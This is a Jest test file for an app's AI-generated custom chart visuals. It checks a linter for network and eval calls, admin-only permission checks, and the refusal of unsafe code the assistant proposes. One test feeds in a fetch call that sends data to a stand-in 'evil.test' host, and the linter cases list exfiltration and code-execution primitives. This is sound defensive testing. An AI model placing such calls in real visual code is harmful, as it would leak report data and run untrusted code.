jest.mock('../utils/ai/providers', () => ({
  ...jest.requireActual('../utils/ai/providers'),
  chat: jest.fn(),
}));

const request = require('supertest');
const AdmZip = require('adm-zip');
const providers = require('../utils/ai/providers');
const { lintVisualCode } = require('../utils/ai/visualLint');
const { setAiConfig } = require('../utils/settingsHelper');
const { buildApp, seedUser, seedDatasource, seedModel, seedReport, seedWorkspace, seedRollup, db } = require('./helpers/testApp');

const app = buildApp();
const SVG_NS = 'http://www.w3.org/2000/svg';
const CODE = `OpenReportRegisterVisual({ render(c, ctx) { c.appendChild(document.createElementNS('${SVG_NS}', 'svg')); } });`;
const MANIFEST = { id: 'Radial Progress!', name: 'Radial progress', dataSchema: { dimensions: [], measures: [{ role: 'value', label: 'Value' }] } };

describe('lintVisualCode', () => {
  test('plain SVG drawing code passes, W3C namespace included', () => {
    expect(lintVisualCode(CODE)).toEqual([]);
  });

  test.each([
    ['fetch', 'fetch("/x")'],
    ['XMLHttpRequest', 'new XMLHttpRequest()'],
    ['WebSocket', 'new WebSocket(u)'],
    ['sendBeacon', 'navigator.sendBeacon(u, d)'],
    ['dynamic import', 'import("x")'],
    ['location', 'location.href = u'],
    ['window.open', 'window.open(u)'],
    ['eval', 'eval(s)'],
    ['new Function', 'new Function(s)()'],
    ['an image beacon', 'img.src = u'],
    ['a remote URL', 'const u = "https://evil.test/?d="'],
    ['a script tag', 'c.innerHTML = "<script>x</scr" + "ipt>"'],
  ])('%s is flagged', (_what, code) => {
    expect(lintVisualCode(code).length).toBeGreaterThan(0);
  });
});

describe('POST /api/workspaces/:wsId/visuals/generated', () => {
  let wsAdmin, wsEditor, ws;
  beforeAll(() => {
    wsAdmin = seedUser({ role: 'editor' });
    wsEditor = seedUser({ role: 'editor' });
    ws = seedWorkspace({ ownerId: wsAdmin });
    db.prepare('INSERT INTO workspace_members (workspace_id, user_id, role) VALUES (?,?,?)').run(ws, wsEditor, 'editor');
  });

  const generate = (uid, body) => request(app).post(`/api/workspaces/${ws}/visuals/generated`).set('x-test-user', uid).send(body);
  const originOf = (id) => db.prepare('SELECT origin FROM custom_visuals WHERE workspace_id = ? AND visual_id = ?').get(ws, id)?.origin;

  test('a workspace editor may not add code to the library', async () => {
    expect((await generate(wsEditor, { manifest: MANIFEST, visualJs: CODE })).status).toBe(403);
  });

  test('the id is forced into the ai- namespace and the row is marked ai', async () => {
    const res = await generate(wsAdmin, { manifest: MANIFEST, visualJs: CODE });
    expect(res.status).toBe(201);
    expect(res.body.visual).toMatchObject({ id: 'ai-radial-progress', origin: 'ai' });
    expect(originOf('ai-radial-progress')).toBe('ai');

    const list = await request(app).get(`/api/workspaces/${ws}/visuals`).set('x-test-user', wsEditor);
    expect(list.body.visuals.find((v) => v.id === 'ai-radial-progress').origin).toBe('ai');
  });

  test('the bundle says where its code came from', async () => {
    const res = await request(app).get(`/api/workspaces/${ws}/visuals/ai-radial-progress/bundle.js`).set('x-test-user', wsEditor);
    expect(res.status).toBe(200);
    expect(res.headers['x-openreport-visual-origin']).toBe('ai');
  });

  test('code that reaches for the network is refused, whatever the card showed', async () => {
    const res = await generate(wsAdmin, { manifest: MANIFEST, visualJs: `${CODE}\nfetch('https://evil.test/?d=' + JSON.stringify(1));` });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/fetch\(\)/);
  });

  test('size and shape limits', async () => {
    // 413 when the JSON body parser stops it first (its cap depends on the app
    // mounting the router), 400 from the route's own 1 MB check otherwise.
    expect([400, 413]).toContain((await generate(wsAdmin, { manifest: MANIFEST, visualJs: `${CODE}//${'x'.repeat(1024 * 1024)}` })).status);
    expect((await generate(wsAdmin, { manifest: { id: 'x', name: 'x' }, visualJs: CODE })).status).toBe(400);
    expect((await generate(wsAdmin, { visualJs: CODE })).status).toBe(400);
  });

  function zipOf(manifest, code) {
    const zip = new AdmZip();
    zip.addFile('manifest.json', Buffer.from(JSON.stringify(manifest)));
    zip.addFile('visual.js', Buffer.from(code));
    return zip.toBuffer();
  }
  const upload = (manifest) => request(app).post(`/api/workspaces/${ws}/visuals`).set('x-test-user', wsAdmin)
    .attach('package', zipOf({ version: '1.0.0', ...manifest }, CODE), 'v.zip');

  test('an uploaded visual is never overwritten by a generated one', async () => {
    expect((await upload({ ...MANIFEST, id: 'ai-taken' })).status).toBe(201);
    const res = await generate(wsAdmin, { manifest: { ...MANIFEST, id: 'taken' }, visualJs: CODE });
    expect(res.status).toBe(409);
    expect(originOf('ai-taken')).toBe('upload');
  });

  test('re-uploading over a generated visual makes it an upload again', async () => {
    expect(originOf('ai-radial-progress')).toBe('ai');
    expect((await upload({ ...MANIFEST, id: 'ai-radial-progress' })).status).toBe(201);
    expect(originOf('ai-radial-progress')).toBe('upload');
    const res = await request(app).get(`/api/workspaces/${ws}/visuals/ai-radial-progress/bundle.js`).set('x-test-user', wsAdmin);
    expect(res.headers['x-openreport-visual-origin']).toBe('upload');
  });
});

describe('the assistant only offers to write a visual to a workspace admin', () => {
  let wsAdmin, wsEditor, globalAdmin, wsReport, looseReport;
  const call = (args) => ({ text: '', toolCalls: [{ id: 'c1', name: 'propose_custom_visual', args, argsError: null }], usage: null });
  const ARGS = { manifest: MANIFEST, visualJs: CODE, binding: { selectedMeasures: ['items.amt_sum'] }, rationale: 'r' };
  const ASK = { messages: [{ role: 'user', text: 'A radial progress?' }], pageContext: { widgets: [] } };

  beforeAll(() => {
    wsAdmin = seedUser({ role: 'editor' });
    wsEditor = seedUser({ role: 'editor' });
    globalAdmin = seedUser({ role: 'admin' });
    const ws = seedWorkspace({ ownerId: wsAdmin });
    db.prepare('INSERT INTO workspace_members (workspace_id, user_id, role) VALUES (?,?,?)').run(ws, wsEditor, 'editor');
    const ds = seedDatasource({ userId: wsAdmin });
    const model = seedModel({ userId: wsAdmin, datasourceId: ds });
    seedRollup({ modelId: model });
    wsReport = seedReport({ userId: wsAdmin, modelId: model, workspaceId: ws });
    const looseModel = seedModel({ userId: globalAdmin, datasourceId: seedDatasource({ userId: globalAdmin }) });
    seedRollup({ modelId: looseModel });
    looseReport = seedReport({ userId: globalAdmin, modelId: looseModel });
  });
  beforeEach(() => {
    providers.chat.mockReset();
    setAiConfig({ provider: 'openai-compat', baseUrl: 'http://llm.test/v1', model: 'm', enabled: true });
  });

  const chat = (uid, report) => request(app).post(`/api/ai/reports/${report}/chat`).set('x-test-user', uid).send(ASK);
  const offered = () => providers.chat.mock.calls[0][0].tools.map((t) => t.name);

  test('workspace admin: tool offered, proposal returned with a cleaned manifest', async () => {
    providers.chat.mockResolvedValueOnce(call({ ...ARGS, manifest: { ...MANIFEST, evil: 'x', configSchema: [{ key: 'c', type: 'color', label: 'C' }, { key: 'bad key', type: 'html' }] } }));
    const res = await chat(wsAdmin, wsReport);
    expect(offered()).toContain('propose_custom_visual');
    const [p] = res.body.proposals;
    expect(p.kind).toBe('customVisual');
    expect(p.manifest.evil).toBeUndefined();
    expect(p.manifest.configSchema).toEqual([{ key: 'c', type: 'color', label: 'C' }]);
    expect(p.dataBinding).toEqual({ selectedDimensions: [], selectedMeasures: ['items.amt_sum'] });
  });

  test('workspace editor: not offered, and refused if the model calls it anyway', async () => {
    providers.chat.mockResolvedValue(call(ARGS));
    const res = await chat(wsEditor, wsReport);
    expect(offered()).not.toContain('propose_custom_visual');
    expect(res.body.proposals).toEqual([]);
    expect(res.body.reply).toMatch(/workspace admin/);
  });

  test('a report outside any workspace has no library to write to', async () => {
    providers.chat.mockResolvedValueOnce({ text: 'ok', toolCalls: [], usage: null });
    await chat(globalAdmin, looseReport);
    expect(offered()).not.toContain('propose_custom_visual');
  });

  test.each([
    ['network code', { ...ARGS, visualJs: `${CODE} fetch('/x')` }],
    ['no registration call', { ...ARGS, visualJs: 'console.log(1)' }],
    ['an unknown field', { ...ARGS, binding: { selectedMeasures: ['items.ghost'] } }],
    ['no field at all', { ...ARGS, binding: {} }],
  ])('%s never reaches the card', async (_what, args) => {
    providers.chat.mockResolvedValue(call(args));
    const res = await chat(wsAdmin, wsReport);
    expect(res.body.proposals).toEqual([]);
  });
});
